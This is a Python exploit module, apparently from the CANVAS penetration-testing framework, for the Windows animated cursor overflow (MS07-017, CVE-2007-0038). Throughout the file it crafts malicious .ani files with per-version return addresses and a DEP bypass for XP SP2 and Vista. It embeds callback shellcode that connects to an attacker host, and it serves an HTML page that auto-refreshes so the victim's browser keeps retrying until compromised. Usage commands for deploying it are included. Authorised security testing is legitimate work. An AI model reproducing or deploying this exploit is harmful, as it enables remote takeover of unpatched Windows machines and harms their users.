#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os,getopt
import socket
from exploitutils import *
from encoder import addencoder
from shellcode import shellcodeGenerator, win32shell
from tcpexploit import tcpexploit
import canvasengine
from canvasengine import socket_save_list
import time

from httpclientside import httpclientside
from MOSDEF import mosdef

NAME='Windows Animated Cursor Overflow (MS07-017)'
DESCRIPTION='Windows Animated Cursor Stack Overflow'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Repeatability']='Infinite'
DOCUMENTATION['Date public']='03/28/07'
DOCUMENTATION['CVE Name'] = 'CVE-2007-0038'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-0038'
DOCUMENTATION['CVSS'] = 9.3
DOCUMENTATION['MSRC'] = "http://www.microsoft.com/technet/security/Bulletin/ms07-017.mspx"
DOCUMENTATION['References']='http://www.determina.com/security.research/vulnerabilities/ani-header.html'
DOCUMENTATION['VersionsAffected']=''

VERSION='1.1'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['XP']
PROPERTY['MSADV']="MS07-017"
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""
XP SP2 useragent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)
Vista Ultimate useragent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.

***READ CAREFULLY***:

Regarding XP SP2 English (with DEP):
We use an almost common ret2libc layout for our exploit in order to disable DEP for the IE process. The problem lies in the fact that the
1st address used is located in clbcatq.dll that has been changed with MS05-051. And there is no way to know if this patch is installed
from the Useragent banner. So we have a couple of return addresses possible for the 1st one (the other 3 don't change):
-0x7701280e: if MS05-051 isn't installed
-0x77011cbe: if MS05-051 is installed
The solution we have chosen is to put a counter in the XP SP2 English (with DEP) case. On 1st connection, it will try with the 1st address
of the couple, then on 2nd connection it will try the 2nd address of the couple, and back to 1st address on next connection and so on.
The exception generated by a wrong address is likely to close IE (might depend on the version), if not, we built the page with a pragma
no-cache and a refresh timer, so IE will try to connect again and get owned this time. If you know what you are doing and are pretty sure
about the level of patch the client has, just put the corresponding address as 1st one in the couple, so it will be used on 1st connection.

Please be aware that the addresses specified for this target will only work on _ENGLISH_ version of XP SP2.

Usage for Windows XP SP2 English (with DEP):
./commandlineInterface.py -p 5555 -v 1
./exploits/httpserver/httpserver.py -O singleexploit:ani_cursor -l 10.10.11.1 -d 5555 -p 8080 -O clientversion:2
"""

CHANGELOG="""
KK 05/01/2007:
Added Windows XP SP2 English (with DEP) target
"""

from libs.riff import *

class theexploit(tcpexploit,httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        #self.searchMethod=self.FindBrowser_FindAnyTag_CmpExtraInfo
        #self.UserAgent=[('Mozilla/','MSIE','')]
        self.shellcode=''
        self.setVersions()
        #by default, do auto-detection
        self.version=0
        self.clientversion=0
        self.name=NAME 
        self.filename='prueba.ani'
        self.listenerArgsDict['fromcreatethread']=1
        self.counter=0
        self.subesp=2000
        return

    def displayVersions(self):
        for v in self.versions.keys():
            print 'Version %d: %s'%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        self.versions[0]=('Autoversion',None)
        self.versions[1]=('Windows XP SP2 English (DEP AlwaysOff or OptIn)',0x77df2740)
        self.versions[2]=('Windows XP SP2 English (DEP OptOut)',(0x7701280e,0x77011cbe),0x7c952080,0x7c91d3f8,0x77df2740)
        self.versions[3]=('Windows Vista SP0',['\x0b\x70','\xab\x7b','\xc6\x90','\x8b\x00']) #some jmp [ebx] addresses
        self.versions[4]=('Windows XP SP2 French (DEP AlwaysOff or OptIn)',0x77dc2740)
        self.versions[5]=('Windows XP SP2 French (DEP OptOut)',(0x76fc280e,0x76fc1cbe),0x7c962080,0x7c92d3f8,0x77dc2740)

    def neededListenerTypes(self):
        # XXX: the listener type is actually returned from httpserver.py
        return []
    
    def createShellcode(self):
        host=self.callback.ip
        port=self.callback.port
        #return self.createWin32Shellcode(self.badstring,host,port)
        #should be createWin32HTTPShellcode()
        #return self.createTestShellcode()
        #return self.createWin32ThreadCallbackShellcode()
        #we set the virtual protect flag here because on Vista our shellcode is mapped 'READ_ONLY'
        httpWrapper=''
        try:
            if self.HTTPMOSDEF:
                print '[!] using HTTP MOSDEF tunneling ..'
                sc=shellcodeGenerator.win32()
                sc.addAttr('findeipnoesp',{'subespval':0x1000})
                if self.useSSLMOSDEF:
                    ssl='s'
                else:
                    ssl=''
                sc.addAttr('httpGetShellcode',{'URL':'http%s://%s:%d'%(ssl,host,port)})
                httpWrapper=sc.get()
                print '[!] HTTP MOSDEF len: %d bytes'%(len(httpWrapper))
        except:
            httpWrapper=''
        self.shellcode=self.createInjectToSelf(host,port,injectme=httpWrapper,movetostack=True)
        #print prettyprint(self.shellcode)
        return self.shellcode
    
    def run(self):
        self.host=self.target.interface
        self.filename=self.argsDict.get('filename',self.filename)
        self.clientversion=self.version
        filedata=self.makefile()
        self.log('Opening %s for output'%(self.filename))
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('Wrote to %s'%(self.filename))
        return 1

    def makefile(self,target_os=None):
        #if we're set to autodetect, then use the target_os
        if self.clientversion==0:
            self.clientversion=int(self.argsDict.get('clientversion',self.clientversion))
        version=1
        if target_os and target_os.version=='Vista':
            version=3
        #you can override the automatically chosen version, but it's a bad idea so we warn you about it
        if self.clientversion!=0:
            if version!=self.clientversion:
                self.log('Warning, we are choosing version %s but we think we should be running %s'%(self.clientversion, version))
            version=self.clientversion
        filedata=''
        self.log('Using version: %d (%d)'%(version,self.clientversion))
        ver=self.versions[version] 
        if version==1 or version==4: #Windows XP SP2
            self.log('Building ANI for XP SP2')
            r=RIFF()
            r.addACON()
            an = ANIHDR()
            an.cFrames=0x4141
            an.cSteps=0x1
            an.JifRate=0x0
            an.flags=0x1
            r.addANIH(an) #crafting our bogus ANIHR 
            data='\0'*(0x50-0x10)
            data+=struct.pack('<L',0)
            data+='\0'*0xc
            data+=struct.pack('<L',ver[1]) 
            data+='\0'*0x14+'A'*(0xa0+1)+'\xeb\x1e' 
            data+='B'*0x20+self.shellcode
            data=struct.pack('<L',len(data))+data
            r.addRAW('anih'+data)  
        elif version==2 or version==5: #Windows XP SP2 (with DEP)
            self.log('Building ANI for XP SP2 (with DEP)')
            r=RIFF()
            r.addACON()
            an = ANIHDR()
            an.cFrames=0x4141
            an.cSteps=0x1
            an.JifRate=0x0
            an.flags=0x1
            r.addANIH(an) #crafting our bogus ANIHR 
            data='A'*0x40
            data+=struct.pack('<L',0)
            data+='B'*0xc
            data+=struct.pack('<L',ver[1][self.counter])
            self.counter+=1
            if self.counter>1:
                self.counter=0
            data+='C'*0x14
            data+=struct.pack('<L',ver[2])
            data+=struct.pack('<L',ver[4])
            data+='D'*4
            data+='\xeb\x22'
            data+='E'*0x16
            data+=struct.pack('<L',ver[3])
            data+='F'*8
            data+=mosdef.assemble('jmp $%d'%(0x90-5),'x86')
            data+='G'*(0x90-5) #some part is overwritten in here
            #self.createWin32ThreadCallbackShellcode() #XXX: WORKAROUND FOR DEP SHELLCODING ISSUES
            data+=self.shellcode
            data=struct.pack('<L',len(data))+data
            r.addRAW('anih'+data)  
        elif version==3: #Windows Vista
            self.log('Building ANI for Vista')
            r=RIFF()
            r.addACON()
            an=ANIHDR()
            an.cFrames=0x4141
            an.cSteps=0x1
            an.JifRate=0x0
            an.flags=0x1
            r.addANIH(an) #crafting our bogus ANIHR
            addy=ver[1] #our geteip
            heapblock=0 #must be zero to pass a check or will be used as argument for RtlFreeHeap, crashing program
            data='\xcc'*(0x44)+intel_order(heapblock)+struct.pack('<L',0)
            data=stroverwrite(data,'\xeb\x54',0) #write in a jmp to our shellcode
            data+=struct.pack('<LL',0,0)
            #get a random return address out of our list
            randreturn=random.randint(0,len(addy)-1)
            data+=addy[randreturn]
            r.addRAW('anih'+intel_order(len(data))+data)  
            r.addRAW(self.shellcode )
            r.padtolength=0x3aeb #our opcode backwards - we jump into the CCCCCCCC
        else:
            self.log('Version %d unknown!'%(version))
        filedata=r.raw()
        return filedata
        
        
    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header, body
        h=header('SERVER')
        b=body()
        from libs.canvasos import canvasos
        self.log('URL Requested: %s'%(prettyprint(clientheader.URL)))
        if clientheader.URL.count(self.filename):
            #the exploit
            target_os=canvasos()
            target_os.load_from_clientheader(clientheader)
            self.log('Found target_os=%s'%(str(target_os)))
            self.createShellcode()
            sploitstring=self.makefile(target_os)
            h.addHeader('Content-type','image/bitmap')
            b.setBody(sploitstring)
        else:
            #redirect to self
            self.log('Redirecting to self')
            h.status='200'
            body="""<HTML>
<HEAD>
<META HTTP-EQUIV="REFRESH" CONTENT="5">
<style>
<!--
BODY{ cursor:url("prueba.ani"); }
-->
</style>
</HEAD>
<BODY>
</BODY>
<HEAD>
<META HTTP-EQUIV="PRAGMA" CONTENT="NO-CACHE">
</HEAD>
</HTML>
"""
            new_body="""<HTML>
<HEAD>
<link href="prueba.ani" TYPE="image/ico" REL="icon">
<style type="text/css">
<!--
#navigator-throbber { list-style-image : url("prueba.ani") !important; }
-->
</style>
</HEAD>
<body onload="putImg('prueba.ani')">
HOLA
<script language="JavaScript" type="text/JavaScript">
<!--
function putImg(p) {
    var l=document.images.length;
    for (i=0;i<l;i++) {
        if (document.images[i].complete!=true || document.images[i].naturalHeight==0) {
            if (p==undefined) {
                document.images[i].style.display="none";
            } else {
                alert('replacing with '+p)
                document.images[i].src=p;
            }
        }
    }
}
-->
</script>
<script type="text/javascript">
putImg("prueba.ani")
</script>
<img src="cow.png">
<img src="prueba.ani>
</body>
</HTML>
"""
            body=body.replace('prueba.ani',self.filename)
            b.setBody(body)
            h.addHeader('Content-Type','text/html')
        return h,b

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
